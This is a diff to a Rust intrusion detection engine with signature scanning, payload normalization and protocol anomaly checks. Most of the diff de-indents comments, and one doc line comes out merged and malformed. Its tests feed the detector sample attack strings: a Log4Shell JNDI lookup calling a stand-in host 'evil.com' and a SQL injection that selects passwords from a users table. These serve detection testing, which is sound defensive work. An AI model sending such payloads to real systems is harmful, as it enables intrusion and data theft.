@@ -17,15 +17,15 @@ use crate::signature::{self, SignatureAction, SignatureSet, SigSeverity};
 /// Alert severity for external consumers
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 pub enum AlertSeverity {
-    /// Informational
+/// Informational
     Info,
-    /// Low
+/// Low
     Low,
-    /// Medium
+/// Medium
     Medium,
-    /// High
+/// High
     High,
-    /// Critical
+/// Critical
     Critical,
 }
 
@@ -44,34 +44,34 @@ impl From<SigSeverity> for AlertSeverity {
 /// An IDS alert
 #[derive(Debug, Clone)]
 pub struct Alert {
-    /// Alert ID / signature ID
+/// Alert ID / signature ID
     pub id: u32,
-    /// Source IP
+/// Source IP
     pub src_ip: IpAddr,
-    /// Destination port
+/// Destination port
     pub dst_port: u16,
-    /// Severity
+/// Severity
     pub severity: AlertSeverity,
-    /// Message
+/// Message
     pub message: String,
-    /// Category
+/// Category
     pub category: String,
-    /// Recommended action
+/// Recommended action
     pub action: IdsVerdict,
-    /// Timestamp
+/// Timestamp
     pub timestamp: chrono::DateTime<chrono::Utc>,
 }
 
 /// IDS verdict on a packet/connection
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum IdsVerdict {
-    /// Allow the traffic
+/// Allow the traffic
     Pass,
-    /// Alert but allow
+/// Alert but allow
     Alert,
-    /// Drop the traffic (IPS mode)
+/// Drop the traffic (IPS mode)
     Drop,
-    /// Reject (send RST/ICMP)
+/// Reject (send RST/ICMP)
     Reject,
 }
 
@@ -80,12 +80,12 @@ pub struct IdsEngine {
     config: Arc<IdsConfig>,
     signatures: Arc<SignatureSet>,
     conn_tracker: Arc<ConnectionTracker>,
-    /// Alert rate limiting per IP
+/// Alert rate limiting per IP
     alert_counts: DashMap<IpAddr, (u32, std::time::Instant)>,
 }
 
 impl IdsEngine {
-    /// Create a new IDS engine with built-in signatures
+/// Create a new IDS engine with built-in signatures
     pub fn new(config: IdsConfig) -> Result<Self, crate::IdsError> {
         let sigs = signature::builtin_mail_signatures();
         let sig_set = SignatureSet::new(sigs)
@@ -112,7 +112,7 @@ impl IdsEngine {
         })
     }
 
-    /// Create with custom signature set
+/// Create with custom signature set
     pub fn with_signatures(config: IdsConfig, sigs: Vec<signature::Signature>) -> Result<Self, crate::IdsError> {
         let sig_set = SignatureSet::new(sigs)
             .map_err(|e| crate::IdsError::Signature(e))?;
@@ -132,7 +132,7 @@ impl IdsEngine {
         })
     }
 
-    /// Inspect a packet/payload. Returns alerts and the recommended verdict.
+/// Inspect a packet/payload. Returns alerts and the recommended verdict.
     pub fn inspect(
         &self,
         src_ip: IpAddr,
@@ -144,17 +144,17 @@ impl IdsEngine {
         let mut verdict = IdsVerdict::Pass;
         let now = chrono::Utc::now();
 
-        // 1. Signature scan with payload normalization
+// 1. Signature scan with payload normalization
         let truncated = if payload.len() > self.config.max_payload_inspect {
             &payload[..self.config.max_payload_inspect]
         } else {
             payload
         };
 
-        // Scan the ORIGINAL bytes first (preserves binary patterns like NOP
-        // sleds that `from_utf8_lossy` would mangle), then also scan the
-        // URL/HTML-entity-decoded form to catch evasion attempts. Merge both
-        // result sets, deduplicating by SID.
+// Scan the ORIGINAL bytes first (preserves binary patterns like NOP
+// sleds that `from_utf8_lossy` would mangle), then also scan the
+// URL/HTML-entity-decoded form to catch evasion attempts. Merge both
+// result sets, deduplicating by SID.
         let normalized = normalize_payload(truncated);
         let raw_matches = self.signatures.scan(truncated);
         let norm_matches = self.signatures.scan(&normalized);
@@ -184,7 +184,7 @@ impl IdsEngine {
             });
         }
 
-        // 2. Protocol anomaly detection
+// 2. Protocol anomaly detection
         let protocol_anomalies = match protocol {
             "smtp" if self.config.enable_smtp_validation => protocol_analyzer::analyze_smtp(payload),
             "dns" if self.config.enable_dns_validation => protocol_analyzer::analyze_dns(payload),
@@ -212,7 +212,7 @@ impl IdsEngine {
             });
         }
 
-        // 3. Connection tracking anomalies
+// 3. Connection tracking anomalies
         let conn_anomalies = self.conn_tracker.record_syn(src_ip, dst_port);
         for anomaly in &conn_anomalies {
             let (id, msg, sev) = match anomaly {
@@ -243,7 +243,7 @@ impl IdsEngine {
             });
         }
 
-        // In detection-only mode, never actually drop
+// In detection-only mode, never actually drop
         if !self.config.inline_mode && verdict == IdsVerdict::Drop {
             verdict = IdsVerdict::Alert;
         }
@@ -260,7 +260,7 @@ impl IdsEngine {
         (verdict, alerts)
     }
 
-    /// Inspect payload and emit a normalized security event.
+/// Inspect payload and emit a normalized security event.
     pub fn inspect_with_event(
         &self,
         src_ip: IpAddr,
@@ -324,31 +324,29 @@ impl IdsEngine {
         ((verdict, alerts), event)
     }
 
-    /// Get active connection count
+/// Get active connection count
     pub fn active_connections(&self) -> usize {
         self.conn_tracker.active_connections()
     }
 
-    /// Run periodic cleanup
+/// Run periodic cleanup
     pub fn cleanup(&self) {
         let timeout = std::time::Duration::from_secs(self.config.connection_timeout_secs);
         self.conn_tracker.cleanup(timeout);
 
-        // Evict stale alert rate-limit entries (older than 60 seconds)
+// Evict stale alert rate-limit entries (older than 60 seconds)
         let stale_cutoff = std::time::Instant::now() - std::time::Duration::from_secs(60);
         self.alert_counts.retain(|_, (_, instant)| *instant > stale_cutoff);
     }
 
-    /// Spawn a background Tokio task that calls [`Self::cleanup`] every
-    /// `interval_secs` seconds.
-    ///
-    /// Without this (or equivalent external scheduling), the connection tracker
-    /// and alert rate-limit map grow unboundedly for long-lived processes.
-    /// The returned [`tokio::task::JoinHandle`] can be aborted by the caller
-    /// to stop the background loop on shutdown.
-    ///
-    /// Requires the engine to be wrapped in an `Arc` so the task can hold an
-    /// independent reference after this method returns.
+/// Spawn a background Tokio task that calls [`Self::cleanup`] every
+/// `interval_secs` seconds.
+/// Without this (or equivalent external scheduling), the connection tracker
+/// and alert rate-limit map grow unboundedly for long-lived processes.
+/// The returned [`tokio::task::JoinHandle`] can be aborted by the caller
+/// to stop the background loop on shutdown.
+/// Requires the engine to be wrapped in an `Arc` so the task can hold an
+/// independent reference after this method returns.
     pub fn run_cleanup_loop(
         self: std::sync::Arc<Self>,
         interval_secs: u64,
@@ -356,7 +354,7 @@ impl IdsEngine {
         tokio::spawn(async move {
             let interval = tokio::time::Duration::from_secs(interval_secs);
             let mut ticker = tokio::time::interval(interval);
-            // Skip the immediate first tick so we don't clean up on startup.
+// Skip the immediate first tick so we don't clean up on startup.
             ticker.tick().await;
             loop {
                 ticker.tick().await;
@@ -376,11 +374,8 @@ impl IdsEngine {
 }
 
 /// Normalize a payload for evasion-resistant signature matching.
-///
-/// Performs a single pass of:
-/// 1. URL-decoding (`%XX` → byte)
+/// Performs a single pass of:/// 1. URL-decoding (`%XX` → byte)
 /// 2. HTML entity decoding (`&#NNN;`, `&#xHH;`, `&lt;`, `&gt;`, `&amp;`, `&quot;`)
-///
 /// This ensures signatures written in plain text still match payloads that
 /// have been encoded to bypass pattern-based detection.
 fn normalize_payload(data: &[u8]) -> Vec<u8> {
@@ -390,11 +385,11 @@ fn normalize_payload(data: &[u8]) -> Vec<u8> {
 
     while let Some(ch) = chars.next() {
         match ch {
-            // URL-form-encoded space: `+` in query strings is decoded as space.
-            // Attackers use `+` to bypass regex patterns that match on \s+,
-            // e.g., `UNION+SELECT` evades `union\s+select` without this step.
+// URL-form-encoded space:`+` in query strings is decoded as space.
+// Attackers use `+` to bypass regex patterns that match on \s+,
+// e.g., `UNION+SELECT` evades `union\s+select` without this step.
             '+' => result.push(' '),
-            // URL decoding: %XX
+// URL decoding:%XX
             '%' => {
                 let mut hex = String::new();
                 for _ in 0..2 {
@@ -419,11 +414,11 @@ fn normalize_payload(data: &[u8]) -> Vec<u8> {
                     result.push_str(&hex);
                 }
             }
-            // HTML entity decoding: &...;
+// HTML entity decoding:&...;
             '&' => {
                 let mut entity = String::new();
                 let mut found_semi = false;
-                // Collect up to 10 chars looking for ';'
+// Collect up to 10 chars looking for ';'
                 let mut lookahead: Vec<char> = Vec::new();
                 while let Some(&c) = chars.peek() {
                     if c == ';' {
@@ -496,7 +491,7 @@ mod tests {
         s.parse().unwrap_or_else(|_| IpAddr::from([10, 0, 0, 1]))
     }
 
-    // ── Basic engine tests ──
+// ── Basic engine tests ──
 
     #[test]
     fn test_ids_engine_basic() {
@@ -536,7 +531,7 @@ mod tests {
         assert_eq!(event.system, SecuritySystem::Ids);
     }
 
-    // ── SMTP smuggling tests ──
+// ── SMTP smuggling tests ──
 
     #[test]
     fn test_smtp_smuggling_dot_stuffing() {
@@ -561,7 +556,7 @@ mod tests {
         );
     }
 
-    // ── Log4Shell variant tests ──
+// ── Log4Shell variant tests ──
 
     #[test]
     fn test_log4shell_basic() {
@@ -599,7 +594,7 @@ mod tests {
         }
     }
 
-    // ── Web exploit detection ──
+// ── Web exploit detection ──
 
     #[test]
     fn test_path_traversal_dotdot() {
@@ -645,12 +640,12 @@ mod tests {
         );
     }
 
-    // ── SQL injection tests ──
+// ── SQL injection tests ──
 
     #[test]
     fn test_sqli_union_select() {
         let engine = make_engine();
-        let payload = b"GET /search?q=1'+UNION+ALL+SELECT+password+FROM+users-- HTTP/1.1\r\n";
+        let payload = b"GET /search?q=1'+UNION+ALL+SELECT+password+FROM+users -- HTTP/1.1\r\n";
         let (_, alerts) = engine.inspect(ip("10.0.0.11"), 80, "http", payload);
         assert!(
             alerts.iter().any(|a| a.id == 2000091),
@@ -659,7 +654,7 @@ mod tests {
         );
     }
 
-    // ── SSRF tests ──
+// ── SSRF tests ──
 
     #[test]
     fn test_ssrf_cloud_metadata() {
@@ -672,7 +667,7 @@ mod tests {
         );
     }
 
-    // ── XSS tests ──
+// ── XSS tests ──
 
     #[test]
     fn test_xss_script_tag() {
@@ -696,7 +691,7 @@ mod tests {
         );
     }
 
-    // ── Command injection ──
+// ── Command injection ──
 
     #[test]
     fn test_command_injection() {
@@ -709,7 +704,7 @@ mod tests {
         );
     }
 
-    // ── SMTP auth abuse ──
+// ── SMTP auth abuse ──
 
     #[test]
     fn test_smtp_auth_plain() {
@@ -722,7 +717,7 @@ mod tests {
         );
     }
 
-    // ── Malware attachment tests ──
+// ── Malware attachment tests ──
 
     #[test]
     fn test_double_extension_attachment() {
@@ -735,7 +730,7 @@ mod tests {
         );
     }
 
-    // ── Deserialization attacks ──
+// ── Deserialization attacks ──
 
     #[test]
     fn test_java_deserialization() {
@@ -746,7 +741,7 @@ mod tests {
         assert!(has_deser, "Java deserialization should be detected");
     }
 
-    // ── XXE ──
+// ── XXE ──
 
     #[test]
     fn test_xxe_attack() {
@@ -759,7 +754,7 @@ mod tests {
         );
     }
 
-    // ── Payload normalization ──
+// ── Payload normalization ──
 
     #[test]
     fn test_normalize_payload_url_decoding() {
@@ -789,14 +784,14 @@ mod tests {
         assert!(s.contains("<script>"), "Numeric entity should decode: {}", s);
     }
 
-    // ── Detection-only mode ──
+// ── Detection-only mode ──
 
     #[test]
     fn test_detection_mode_no_drop() {
         let engine = make_engine(); // inline_mode = false (default)
         let payload = b"GET /?x=${jndi:ldap://evil.com/x} HTTP/1.1\r\n";
         let (verdict, _) = engine.inspect(ip("10.0.0.20"), 80, "http", payload);
-        // In detection-only mode, verdict should be Alert, not Drop
+// In detection-only mode, verdict should be Alert, not Drop
         assert_ne!(verdict, IdsVerdict::Drop, "Detection-only mode should not drop");
     }
 
@@ -808,7 +803,7 @@ mod tests {
         assert_eq!(verdict, IdsVerdict::Drop, "Inline/IPS mode should drop malicious traffic");
     }
 
-    // ── Cleanup ──
+// ── Cleanup ──
 
     #[test]
     fn test_cleanup_runs() {
@@ -817,7 +812,7 @@ mod tests {
         assert_eq!(engine.active_connections(), 0);
     }
 
-    // ── Edge cases ──
+// ── Edge cases ──
 
     #[test]
     fn test_empty_payload() {
@@ -832,7 +827,7 @@ mod tests {
         let engine = make_engine();
         let large = vec![b'A'; 10_000_000]; // 10 MB
         let (verdict, _) = engine.inspect(ip("10.0.0.23"), 80, "http", &large);
-        // Should not panic and should truncate to max_payload_inspect
+// Should not panic and should truncate to max_payload_inspect
         assert!(matches!(verdict, IdsVerdict::Pass | IdsVerdict::Alert));
     }
 
@@ -841,15 +836,15 @@ mod tests {
         let engine = make_engine();
         let binary: Vec<u8> = (0..256u16).map(|i| i as u8).collect();
         let (_, _) = engine.inspect(ip("10.0.0.24"), 80, "tcp", &binary);
-        // Should not panic on binary data
+// Should not panic on binary data
     }
 
-    // ── Multi-alert deduplication ──
+// ── Multi-alert deduplication ──
 
     #[test]
     fn test_alerts_deduplicated_across_raw_and_normalized() {
         let engine = make_engine();
-        // This payload matches both raw and normalized (URL-decoded form)
+// This payload matches both raw and normalized (URL-decoded form)
         let payload = b"VRFY admin\r\n";
         let (_, alerts) = engine.inspect(ip("10.0.0.25"), 25, "smtp", payload);
         let vrfy_count = alerts.iter().filter(|a| a.id == 2000003).count();
